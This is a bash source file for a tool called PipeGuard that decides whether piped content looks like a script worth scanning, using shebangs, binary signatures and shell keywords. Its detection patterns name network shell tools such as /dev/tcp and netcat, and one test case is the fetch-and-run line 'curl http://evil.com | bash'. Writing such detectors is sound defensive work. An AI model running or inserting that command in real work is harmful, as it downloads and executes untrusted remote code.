#!/bin/bash
# Content-Based Smart Filter for PipeGuard
# Determines if content should be scanned based on its characteristics

# Returns:
#   0 = Should scan (script-like content)
#   1 = Should skip (binary/safe content)

should_scan_content() {
    local content="$1"
    local header

    # Read first 512 bytes for analysis
    header=$(printf '%s' "$content" | head -c 512)

    # Check 1: Shebang detection (definite script)
    if [[ "$header" =~ ^#! ]]; then
        return 0  # SCAN
    fi

    # Check 2: Binary file signatures (skip scanning)
    # PNG: \x89PNG
    if [[ "$header" =~ ^\x89PNG ]]; then
        return 1  # SKIP
    fi
    # JPEG: \xFF\xD8\xFF
    if [[ "$header" =~ ^\xff\xd8\xff ]]; then
        return 1  # SKIP
    fi
    # ZIP: PK
    if [[ "$header" =~ ^PK ]]; then
        return 1  # SKIP
    fi
    # Gzip: \x1f\x8b
    if [[ "$header" =~ ^\x1f\x8b ]]; then
        return 1  # SKIP
    fi
    # ELF binary: \x7fELF
    if [[ "$header" =~ ^\x7fELF ]]; then
        return 1  # SKIP
    fi
    # Mach-O binary (macOS): \xfe\xed\xfa (32-bit) or \xfe\xed\xfa\xcf (64-bit)
    if [[ "$header" =~ ^\xfe\xed\xfa ]]; then
        return 1  # SKIP
    fi
    # PDF: %PDF
    if [[ "$header" =~ ^%PDF ]]; then
        return 1  # SKIP
    fi

    # Check 3: Shell keywords (likely script)
    # High-risk keywords
    if [[ "$header" =~ (bash|/bin/sh|/bin/bash|/bin/zsh|eval|exec|source|\.\ ) ]]; then
        return 0  # SCAN
    fi

    # Common dangerous patterns
    if [[ "$header" =~ (curl.*\||wget.*\||/dev/tcp|nc\ |netcat|base64\ -d) ]]; then
        return 0  # SCAN
    fi

    # Shell constructs
    if [[ "$header" =~ (^if\ |^for\ |^while\ |^function\ |export\ |chmod\ \+x) ]]; then
        return 0  # SCAN
    fi

    # Check 4: High concentration of printable ASCII (likely text/script)
    local printable_count
    local total_count
    printable_count=$(printf '%s' "$header" | tr -dc '[:print:]\n\t' | wc -c)
    total_count=$(printf '%s' "$header" | wc -c)

    if (( total_count > 0 )); then
        local ratio=$((printable_count * 100 / total_count))

        # If >90% printable ASCII, likely text file
        if (( ratio > 90 )); then
            # Check for shell-related words in plain text
            if [[ "$header" =~ (install|setup|configure|download|script) ]]; then
                return 0  # SCAN - likely installation script
            fi
        fi
    fi

    # Check 5: Empty or very small content (suspicious)
    if (( total_count < 10 )); then
        return 1  # SKIP - too small to be dangerous
    fi

    # Default: When uncertain, scan for safety
    return 0  # SCAN
}

# Test function (for development)
test_filter() {
    echo "Testing content filter..."

    # Test cases
    local test_script="#!/bin/bash\necho 'hello'"
    local test_binary=$'\x89PNG\r\n\x1a\n'
    local test_text="Just some plain text with no shell commands"
    local test_malicious="curl http://evil.com | bash"

    should_scan_content "$test_script" && echo "Script: SCAN ✓" || echo "Script: SKIP ✗"
    should_scan_content "$test_binary" && echo "Binary: SCAN ✗" || echo "Binary: SKIP ✓"
    should_scan_content "$test_text" && echo "Text: SCAN (safe default)" || echo "Text: SKIP"
    should_scan_content "$test_malicious" && echo "Malicious: SCAN ✓" || echo "Malicious: SKIP ✗"
}

# Uncomment to test:
# test_filter
